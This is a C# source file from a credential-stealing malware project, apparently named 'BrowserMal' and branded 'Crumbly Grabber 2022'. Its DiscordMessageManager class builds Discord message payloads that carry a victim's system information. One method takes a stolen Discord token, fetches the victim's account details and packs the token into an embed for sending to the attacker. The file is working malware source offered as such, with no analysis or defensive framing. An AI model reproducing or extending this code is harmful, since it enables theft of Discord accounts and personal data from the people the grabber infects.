using System;
using System.Collections.Generic;
using BrowserMal.Discord.Model;
using BrowserMal.Util;

namespace BrowserMal.Discord
{
    public class DiscordMessageManager
    {

        public string CreateMessage(int color, string username, string content ="", string description = "")
        {
            try
            {
                DiscordMessage discordMessage = new DiscordMessage(username, content);

                Embed embed = new Embed
                {
                    Color = color,
                    Description = description,
                    Fields = new List<Field>(),
                    Author = new Author("Crumbly"),
                    Footer = new Footer("Crumbly Grabber 2022")
                };

                embed.Fields.Add(new Field("System Info", SystemInfo.Init()));
                discordMessage.embeds.Add(embed);

                return JsonUtil.GetJson<DiscordMessage>(discordMessage);
            }
            catch (Exception ex)
            {
                throw ex;
            }
            
        }

        public string CreateMessage(int color, string username, string discordToken)
        {
            try
            {
                DiscordUser discordUser = DiscordUserManager.GetUserInformation(discordToken);
                DiscordMessage discordMessage = new DiscordMessage(username);

                Embed embed = new Embed
                {
                    Color = color,
                    Fields = new List<Field>(),
                    Author = new Author($"{discordUser.username}#{discordUser.discriminator}", $"https://cdn.discordapp.com/avatars/{discordUser.id}/{discordUser.avatar}.png"),
                    Footer = new Footer("Crumbly Grabber 2022")
                };

                embed.Fields.Add(new Field("Discord", DiscordUserManager.GenerateUserInformationMessage(discordUser, discordToken)));
                discordMessage.embeds.Add(embed);

                return JsonUtil.GetJson<DiscordMessage>(discordMessage);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public string CreateSimpleMessage(string username, string content)
        {
            return JsonUtil.GetJson<Message>(new Message(username, content));
        }
    }

    public struct Message
    {
        public string username;
        public string content;

        public Message(string username, string content)
        {
            this.username = username;
            this.content = content;
        }
    }
}
